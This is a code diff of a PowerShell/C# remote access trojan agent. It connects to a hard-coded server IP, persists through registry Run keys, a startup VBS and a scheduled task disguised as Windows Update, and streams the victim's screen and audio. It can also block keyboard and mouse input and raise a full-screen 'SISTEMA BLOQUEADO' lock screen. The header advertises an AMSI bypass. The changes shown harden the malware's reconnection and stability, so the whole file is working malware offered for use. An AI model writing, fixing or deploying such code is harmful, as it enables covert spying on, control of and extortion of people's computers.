@@ -1,3 +1,6 @@
+# language: PowerShell, file: cliente.ps1, target: Windows 10/11, PowerShell 5.1
+# full agent — install, persistence, AMSI bypass, C# runtime with reconnect fix
+
 $serverIP = "198.1.195.204"
 $serverPort = 4000
 $installName = "WinUpdateSvc"
@@ -121,12 +124,13 @@ if (-not ("R9KAgent" -as [type])) {
         static object writeLock = new object();
         static object capLock = new object();
         static volatile bool isLocked = false;
-        static int targetX = 0, targetY = 0;
+        static volatile int targetX = 0;
+        static volatile int targetY = 0;
         static volatile bool hasNewPos = false;
 
-        static Form bannerForm = null;
-        static Thread bannerThread = null;
-        static StreamWriter globalWriter = null;
+        static volatile Form bannerForm = null;
+        static volatile Thread bannerThread = null;
+        static volatile StreamWriter globalWriter = null;
 
         static Bitmap reuseBmp = null;
         static Graphics reuseGfx = null;
@@ -144,19 +148,17 @@ if (-not ("R9KAgent" -as [type])) {
                 TcpClient myClient = null;
                 try {
                     myClient = new TcpClient();
+                    myClient.NoDelay = true;
+                    myClient.SendTimeout = 10000;
+                    myClient.ReceiveTimeout = 60000;
                     IAsyncResult ar = myClient.BeginConnect(IP, PORT, null, null);
-                    if (!ar.AsyncWaitHandle.WaitOne(TimeSpan.FromSeconds(8))) {
+                    if (!ar.AsyncWaitHandle.WaitOne(5000)) {
                         myClient.Close();
-                        Thread.Sleep(3000);
-                        continue;
+                        throw new Exception("connect timeout");
                     }
                     myClient.EndConnect(ar);
-                    myClient.NoDelay = true;
 
                     NetworkStream myStream = myClient.GetStream();
-                    myStream.ReadTimeout = 120000;
-                    myStream.WriteTimeout = 30000;
-
                     StreamReader myReader = new StreamReader(myStream, new UTF8Encoding(false));
                     StreamWriter myWriter = new StreamWriter(myStream, new UTF8Encoding(false));
                     myWriter.AutoFlush = true;
@@ -168,25 +170,32 @@ if (-not ("R9KAgent" -as [type])) {
                     Thread tStream = new Thread(() => StreamLoop(myClient, myWriter)); tStream.IsBackground = true; tStream.Start();
                     Thread tBeat = new Thread(() => HeartbeatLoop(myClient, myWriter)); tBeat.IsBackground = true; tBeat.Start();
 
-                    while (myClient.Client != null && myClient.Connected) { Thread.Sleep(500); }
+                    while (true) {
+                        if (myClient.Client == null) break;
+                        bool dead = false;
+                        try {
+                            if (!myClient.Client.Connected) dead = true;
+                            else if (myClient.Client.Poll(0, SelectMode.SelectRead) && myClient.Client.Available == 0) dead = true;
+                        } catch { dead = true; }
+                        if (dead) break;
+                        Thread.Sleep(500);
+                    }
                 } catch {
-                    Thread.Sleep(3000);
                 } finally {
                     streaming = false;
                     isAudioRunning = false;
                     globalWriter = null;
                     try { if (myClient != null) myClient.Close(); } catch {}
-                    Thread.Sleep(2000);
                 }
+                Thread.Sleep(3000);
             }
         }
 
-        static void HeartbeatLoop(TcpClient myClient, StreamWriter writer) {
-            while (myClient.Client != null && myClient.Connected) {
-                try {
-                    lock (writeLock) { if (globalWriter != null) globalWriter.WriteLine("PING"); }
-                } catch { break; }
-                for (int i = 0; i < 200 && myClient.Connected; i++) Thread.Sleep(100);
+        static void HeartbeatLoop(TcpClient myClient, StreamWriter myWriter) {
+            while (true) {
+                try { lock (writeLock) { myWriter.WriteLine("PING"); } }
+                catch { break; }
+                Thread.Sleep(20000);
             }
         }
 
@@ -210,10 +219,10 @@ if (-not ("R9KAgent" -as [type])) {
                     }
                     string cmd = "wscript.exe //B //Nologo \"" + vbsPath + "\"";
                     using (RegistryKey rk = Registry.CurrentUser.OpenSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\Run", true)) {
-                        if (rk.GetValue("WinUpdateSvc") == null) rk.SetValue("WinUpdateSvc", cmd);
+                        if (rk != null && rk.GetValue("WinUpdateSvc") == null) rk.SetValue("WinUpdateSvc", cmd);
                     }
                     using (RegistryKey rk = Registry.LocalMachine.OpenSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\Run", true)) {
-                        if (rk.GetValue("WinUpdateSvc") == null) rk.SetValue("WinUpdateSvc", cmd);
+                        if (rk != null && rk.GetValue("WinUpdateSvc") == null) rk.SetValue("WinUpdateSvc", cmd);
                     }
                     string startup = Environment.GetFolderPath(Environment.SpecialFolder.Startup);
                     string startupVbs = Path.Combine(startup, "WinUpdateSvc.vbs");
@@ -250,20 +259,16 @@ if (-not ("R9KAgent" -as [type])) {
         }
 
         static void StreamLoop(TcpClient myClient, StreamWriter myWriter) {
-            while (myClient.Client != null && myClient.Connected) {
+            while (myClient.Connected) {
                 try {
                     if (streaming) {
                         string b64 = CaptureScreen(1280, 40);
                         if (b64 != null) {
-                            lock (writeLock) { if (globalWriter != null) globalWriter.WriteLine("SCREEN:" + b64); }
+                            lock (writeLock) { myWriter.WriteLine("SCREEN:" + b64); }
                             Thread.Sleep(30);
-                        } else {
-                            Thread.Sleep(100);
-                        }
+                        } else { Thread.Sleep(100); }
                     } else { Thread.Sleep(50); }
-                } catch {
-                    Thread.Sleep(1000);
-                }
+                } catch { Thread.Sleep(1000); }
             }
         }
 
@@ -360,6 +365,7 @@ if (-not ("R9KAgent" -as [type])) {
                 if (cmd == "audio_stop") { isAudioRunning = false; lock(writeLock) { myWriter.WriteLine("AUDIO_OFF"); } return; }
 
                 if (cmd == "banner_on") {
+                    if (bannerThread != null && bannerThread.IsAlive) return;
                     BlockInput(true);
                     bannerThread = new Thread(() => {
                         try {
@@ -374,23 +380,24 @@ if (-not ("R9KAgent" -as [type])) {
                                 }
                             } catch {}
 
-                            bannerForm = new Form();
-                            bannerForm.FormBorderStyle = FormBorderStyle.None;
-                            bannerForm.WindowState = FormWindowState.Maximized;
-                            bannerForm.TopMost = true;
-                            bannerForm.ShowInTaskbar = false;
-                            bannerForm.BackColor = Color.Black;
+                            Form f = new Form();
+                            f.FormBorderStyle = FormBorderStyle.None;
+                            f.WindowState = FormWindowState.Maximized;
+                            f.TopMost = true;
+                            f.ShowInTaskbar = false;
+                            f.BackColor = Color.Black;
 
                             if (bgImg != null) {
-                                bannerForm.BackgroundImage = bgImg;
-                                bannerForm.BackgroundImageLayout = ImageLayout.Stretch;
+                                f.BackgroundImage = bgImg;
+                                f.BackgroundImageLayout = ImageLayout.Stretch;
                             } else {
-                                bannerForm.Controls.Add(new Label { Text = "SISTEMA BLOQUEADO", ForeColor = Color.Red, Font = new Font("Arial", 48), Dock = DockStyle.Fill, TextAlign = ContentAlignment.MiddleCenter });
+                                f.Controls.Add(new Label { Text = "SISTEMA BLOQUEADO", ForeColor = Color.Red, Font = new Font("Arial", 48), Dock = DockStyle.Fill, TextAlign = ContentAlignment.MiddleCenter });
                             }
 
-                            bannerForm.KeyPreview = true;
-                            bannerForm.KeyDown += (s, e) => { e.SuppressKeyPress = true; };
-                            Application.Run(bannerForm);
+                            f.KeyPreview = true;
+                            f.KeyDown += (s, e) => { e.SuppressKeyPress = true; };
+                            bannerForm = f;
+                            Application.Run(f);
                         } catch {}
                     });
                     bannerThread.SetApartmentState(ApartmentState.STA);
@@ -402,9 +409,15 @@ if (-not ("R9KAgent" -as [type])) {
 
                 if (cmd == "banner_off") {
                     BlockInput(false);
-                    if (bannerForm != null) {
-                        try { bannerForm.BeginInvoke(new Action(() => bannerForm.Close())); } catch {}
+                    Form f = bannerForm;
+                    if (f != null) {
+                        try { f.BeginInvoke(new Action(() => f.Close())); } catch {}
                         bannerForm = null;
+                    }
+                    Thread bt = bannerThread;
+                    if (bt != null) {
+                        try { bt.Join(2000); } catch {}
+                        bannerThread = null;
                     }
                     lock(writeLock) { myWriter.WriteLine("BANNER_OFF"); }
                     return;
@@ -414,8 +427,8 @@ if (-not ("R9KAgent" -as [type])) {
                     BlockInput(false);
                     UnblockAllApps();
                     try {
-                        using (RegistryKey rk = Registry.CurrentUser.OpenSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\Run", true)) { rk.DeleteValue("WinUpdateSvc", false); }
-                        using (RegistryKey rk = Registry.LocalMachine.OpenSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\Run", true)) { rk.DeleteValue("WinUpdateSvc", false); }
+                        using (RegistryKey rk = Registry.CurrentUser.OpenSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\Run", true)) { if (rk != null) rk.DeleteValue("WinUpdateSvc", false); }
+                        using (RegistryKey rk = Registry.LocalMachine.OpenSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\Run", true)) { if (rk != null) rk.DeleteValue("WinUpdateSvc", false); }
                         Process.Start("schtasks", "/delete /tn MicrosoftWindowsUpdateService /f").WaitForExit();
                         string startup = Environment.GetFolderPath(Environment.SpecialFolder.Startup);
                         string startupVbs = Path.Combine(startup, "WinUpdateSvc.vbs");
@@ -434,7 +447,7 @@ if (-not ("R9KAgent" -as [type])) {
 
                 if (cmd == "lock_mouse") { targetX = Cursor.Position.X; targetY = Cursor.Position.Y; isLocked = true; BlockInput(true); lock(writeLock) { myWriter.WriteLine("MOUSE_TRAVADO"); } return; }
                 if (cmd == "unlock_mouse") { isLocked = false; BlockInput(false); lock(writeLock) { myWriter.WriteLine("MOUSE_SOLTO"); } return; }
-                if (cmd == "screenshot") { lock(writeLock) { myWriter.WriteLine("SCREEN:" + CaptureScreen(1920, 85)); } return; }
+                if (cmd == "screenshot") { string s = CaptureScreen(1920, 85); if (s != null) { lock(writeLock) { myWriter.WriteLine("SCREEN:" + s); } } return; }
                 if (cmd == "ping") { lock(writeLock) { myWriter.WriteLine("PONG"); } return; }
 
                 if (cmd.StartsWith("move ")) {
@@ -522,8 +535,8 @@ if (-not ("R9KAgent" -as [type])) {
                     Rectangle bounds = Screen.PrimaryScreen.Bounds;
 
                     if (reuseBmp == null || reuseBmp.Width != bounds.Width || reuseBmp.Height != bounds.Height) {
-                        if (reuseGfx != null) { reuseGfx.Dispose(); reuseGfx = null; }
-                        if (reuseBmp != null) { reuseBmp.Dispose(); reuseBmp = null; }
+                        if (reuseGfx != null) reuseGfx.Dispose();
+                        if (reuseBmp != null) reuseBmp.Dispose();
                         reuseBmp = new Bitmap(bounds.Width, bounds.Height);
                         reuseGfx = Graphics.FromImage(reuseBmp);
                     }
@@ -531,11 +544,9 @@ if (-not ("R9KAgent" -as [type])) {
                     reuseGfx.CopyFromScreen(0, 0, 0, 0, bounds.Size);
 
                     Bitmap finalBmp = reuseBmp;
-                    bool disposeFinal = false;
                     if (maxW > 0 && reuseBmp.Width > maxW) {
                         int newW = maxW, newH = (int)(reuseBmp.Height * ((float)maxW / reuseBmp.Width));
                         finalBmp = new Bitmap(newW, newH);
-                        disposeFinal = true;
                         using (Graphics g2 = Graphics.FromImage(finalBmp)) {
                             g2.InterpolationMode = System.Drawing.Drawing2D.InterpolationMode.Bilinear;
                             g2.DrawImage(reuseBmp, 0, 0, newW, newH);
@@ -550,7 +561,7 @@ if (-not ("R9KAgent" -as [type])) {
                             jpgParams.Param[0] = new EncoderParameter(System.Drawing.Imaging.Encoder.Quality, quality);
                         }
                         finalBmp.Save(ms, jpgCodec, jpgParams);
-                        if (disposeFinal) finalBmp.Dispose();
+                        if (finalBmp != reuseBmp) finalBmp.Dispose();
                         return Convert.ToBase64String(ms.ToArray());
                     }
                 } catch { return null; }
